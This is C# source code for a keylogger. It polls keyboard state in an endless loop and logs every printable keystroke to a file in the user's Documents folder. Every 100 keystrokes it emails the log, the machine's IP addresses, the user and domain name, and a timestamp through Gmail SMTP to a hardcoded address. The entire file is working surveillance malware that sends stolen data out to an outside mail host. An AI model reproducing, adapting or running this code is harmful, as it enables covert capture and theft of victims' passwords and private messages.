using System;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;

namespace KeyLogger
{
    class Program
    {
        
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        static long numbersOfKeystrokes  = 0;

        static void Main(string[] args)
        {
            String filePath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filePath))
            {
                Directory.CreateDirectory(filePath);
            }

            string path = filePath + @"\keystrokes.txt";
            if (!File.Exists(path))

            {
                using (StreamWriter sw = File.CreateText(path))
                {
                   
                }
            }

            

            while (true)
            {


                Thread.Sleep(5);



                for (int i = 32; i < 127; i++)
                {
                    int keyState = GetAsyncKeyState(i);
                    if ( keyState == -32767)
                    {
                        Console.Write((char)i + ", ");

                        using (StreamWriter sw = File.AppendText(path))
                        {
                            sw.Write((char)i);
                        }
                        numbersOfKeystrokes++;
                        if (numbersOfKeystrokes % 100 == 0) { SendNewMessage(); }
                        



                    }
                    


                }

            }
        }//main
        static void SendNewMessage()
        {
            String folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string filePath = folderName + @"\keystrokes.txt";

            String logcContent = File.ReadAllText(filePath);
            string emailBody = "";

            DateTime now = DateTime.Now;
            string subject = "Mesagge From Keylogger";
            var host = Dns.GetHostEntry(Dns.GetHostName());
            foreach (var address in host.AddressList)
            {
                emailBody += "Address" + address; 
            }
            emailBody += "\n User" + Environment.UserDomainName + "\\" + Environment.UserName;
            emailBody += "\n Time: " + now.ToString();
            emailBody += "\nhost " + host;
            emailBody += logcContent;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();
            mailMessage.From = new MailAddress("havsan.kadir.karaoglu@gmail.com");
            mailMessage.To.Add("havsan.kadir.karaoglu@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("havsan.kadir.karaoglu@gmail.com", "Password");
            mailMessage.Body = emailBody;
            client.Send(mailMessage);


        }



    }
    }
